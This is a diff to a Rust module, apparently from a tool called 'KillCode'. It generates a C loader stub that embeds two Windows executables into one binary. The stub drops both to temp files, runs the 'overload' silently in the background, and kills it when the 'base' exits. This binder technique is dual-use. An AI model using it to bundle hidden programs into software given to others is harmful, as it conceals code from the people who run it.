@@ -3,20 +3,25 @@ use std::path::Path;
 use std::process::Command;
 use std::fs;
 
-use crate::core::binary::BinaryInfo;
 
-/// The C loader stub template for Windows PE binaries
-const WINDOWS_LOADER_STUB: &str = r#"
+
+/// Enhanced Windows loader stub that kills overload when base exits
+const WINDOWS_LOADER_STUB_STOP_ON_EXIT: &str = r#"
 #include <windows.h>
 #include <stdio.h>
 
 // External symbols for embedded binaries
-extern char _binary_first_exe_start[];
-extern char _binary_first_exe_end[];
-extern char _binary_second_exe_start[];
-extern char _binary_second_exe_end[];
+// Note: objcopy generates symbols based on the input filename. 
+// Since we are linking against .exe files (e.g., base.exe), the generated symbols include '_exe_' in their names.
+extern char _binary_base_exe_start[];
+extern char _binary_base_exe_end[];
+extern char _binary_overload_exe_start[];
+extern char _binary_overload_exe_end[];
 
-static int execute_binary(char* binary_data, size_t binary_size, const char* name, int wait_for_completion) {
+static HANDLE overload_process = NULL;
+static DWORD overload_pid = 0;
+
+static int execute_binary(char* binary_data, size_t binary_size, const char* name, int is_base) {
     // Create a temporary file
     char temp_path[MAX_PATH];
     char temp_dir[MAX_PATH];
@@ -50,7 +55,16 @@ static int execute_binary(char* binary_data, size_t binary_size, const char* nam
         return -1;
     }
     
-    if (wait_for_completion) {
+    if (!is_base) {
+        // This is the overload process - store handle and PID
+        overload_process = pi.hProcess;
+        overload_pid = pi.dwProcessId;
+        CloseHandle(pi.hThread); // We don't need the thread handle
+        
+        // Don't delete file yet, it's running
+        return 0;
+    } else {
+        // This is the base process - wait for it to complete
         WaitForSingleObject(pi.hProcess, INFINITE);
         
         DWORD exit_code;
@@ -60,44 +74,46 @@ static int execute_binary(char* binary_data, size_t binary_size, const char* nam
         CloseHandle(pi.hThread);
         DeleteFileA(temp_path);
         
+        // Base process completed - kill overload if it's still running
+        if (overload_process != NULL) {
+            fprintf(stderr, "[KillCode] Base binary completed, terminating overload process (PID: %lu)\n", overload_pid);
+            TerminateProcess(overload_process, 0);
+            CloseHandle(overload_process);
+            
+            // Clean up overload file
+            char overload_path[MAX_PATH];
+            sprintf(overload_path, "%s\\overload.exe", temp_dir);
+            DeleteFileA(overload_path);
+        }
+        
         return exit_code;
     }
-    
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    
-    return 0;
 }
 
 int main(int argc, char** argv) {
-    size_t first_size = _binary_first_exe_end - _binary_first_exe_start;
-    size_t second_size = _binary_second_exe_end - _binary_second_exe_start;
+    size_t base_size = _binary_base_exe_end - _binary_base_exe_start;
+    size_t overload_size = _binary_overload_exe_end - _binary_overload_exe_start;
     
-    int sync_mode = SYNC_MODE_PLACEHOLDER;
-    
-    if (execute_binary(_binary_first_exe_start, first_size, "first", sync_mode) != 0) {
-        fprintf(stderr, "Failed to execute first binary\n");
+    // Start overload first (non-blocking)
+    if (execute_binary(_binary_overload_exe_start, overload_size, "overload", 0) != 0) {
+        fprintf(stderr, "[KillCode] Failed to start overload binary\n");
         return 1;
     }
     
-    if (execute_binary(_binary_second_exe_start, second_size, "second", 1) != 0) {
-        fprintf(stderr, "Failed to execute second binary\n");
-        return 1;
-    }
+    // Execute base and wait for completion
+    int base_exit = execute_binary(_binary_base_exe_start, base_size, "base", 1);
     
-    return 0;
+    return base_exit;
 }
 "#;
 
-/// Merge two Windows PE binaries
-pub fn merge_windows_pe(
+/// Merge two Windows PE binaries with stop-on-exit logic
+pub fn merge_windows_pe_stop_on_exit(
     base_data: &[u8],
     overload_data: &[u8],
-    mode: &str,
-    sync: bool,
     work_path: &Path,
 ) -> Result<String> {
-    log::info!("🪟 Merging Windows PE binaries...");
+    log::info!("🪟 Merging Windows PE binaries with stop-on-exit mode...");
     
     // Check if MinGW cross-compiler is available
     let mingw_gcc = "x86_64-w64-mingw32-gcc";
@@ -113,35 +129,21 @@ pub fn merge_windows_pe(
     
     log::info!("✅ Using MinGW compiler: {}", mingw_gcc);
     
-    // Determine order based on mode
-    let (first_data, second_data) = match mode {
-        "before" => (overload_data, base_data),  // Overload runs first
-        "after" => (base_data, overload_data),   // Base runs first
-        _ => (overload_data, base_data),
-    };
-    
-    log::info!("Merge mode: {}, Sync: {}", mode, sync);
-    
     // Write binaries to temp files
-    let first_path = work_path.join("first.exe");
-    let second_path = work_path.join("second.exe");
+    let base_path = work_path.join("base.exe");
+    let overload_path = work_path.join("overload.exe");
     
-    fs::write(&first_path, first_data)?;
-    fs::write(&second_path, second_data)?;
+    fs::write(&base_path, base_data)?;
+    fs::write(&overload_path, overload_data)?;
     
-    log::info!("Wrote PE binaries: first={} bytes, second={} bytes", 
-               first_data.len(), second_data.len());
+    log::info!("Wrote PE binaries: base={} bytes, overload={} bytes", 
+               base_data.len(), overload_data.len());
     
     // Create Windows loader stub
-    let loader_code = WINDOWS_LOADER_STUB.replace(
-        "SYNC_MODE_PLACEHOLDER",
-        if sync { "1" } else { "0" }
-    );
-    
     let loader_path = work_path.join("loader_stub.c");
-    fs::write(&loader_path, loader_code)?;
+    fs::write(&loader_path, WINDOWS_LOADER_STUB_STOP_ON_EXIT)?;
     
-    log::info!("Created Windows loader stub");
+    log::info!("Created Windows stop-on-exit loader stub");
     
     // Convert PE binaries to object files using MinGW objcopy
     log::info!("Converting PE binaries to object files...");
@@ -152,7 +154,7 @@ pub fn merge_windows_pe(
             "-I", "binary",
             "-O", "pe-x86-64",
             "-B", "i386:x86-64",
-            "first.exe", "first.o"
+            "base.exe", "base.o"
         ],
         work_path
     )?;
@@ -163,7 +165,7 @@ pub fn merge_windows_pe(
             "-I", "binary",
             "-O", "pe-x86-64",
             "-B", "i386:x86-64",
-            "second.exe", "second.o"
+            "overload.exe", "overload.o"
         ],
         work_path
     )?;
@@ -185,8 +187,8 @@ pub fn merge_windows_pe(
         mingw_gcc,
         &[
             "loader.o",
-            "first.o",
-            "second.o",
+            "base.o",
+            "overload.o",
             "-o",
             output_name,
             "-static",
@@ -196,7 +198,7 @@ pub fn merge_windows_pe(
     
     let merged_path = work_path.join(output_name);
     
-    log::info!("✅ Windows PE binary merged successfully");
+    log::info!("✅ Windows PE binary merged successfully with stop-on-exit");
     
     Ok(merged_path.to_string_lossy().to_string())
 }
@@ -225,33 +227,4 @@ fn run_command(cmd: &str, args: &[&str], cwd: &Path) -> Result<()> {
     }
 
     Ok(())
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-    use tempfile::TempDir;
-
-    #[test]
-    #[ignore] // Requires MinGW to be installed
-    fn test_windows_pe_merge() {
-        let temp_dir = TempDir::new().unwrap();
-        
-        // Simple PE header (MZ magic)
-        let base_data = vec![0x4d, 0x5a];
-        let overload_data = vec![0x4d, 0x5a];
-        
-        let result = merge_windows_pe(
-            &base_data,
-            &overload_data,
-            "before",
-            true,  // sync mode
-            temp_dir.path(),
-        );
-        
-        // Will fail without MinGW installed
-        if result.is_err() {
-            println!("Expected: MinGW not installed");
-        }
-    }
 }
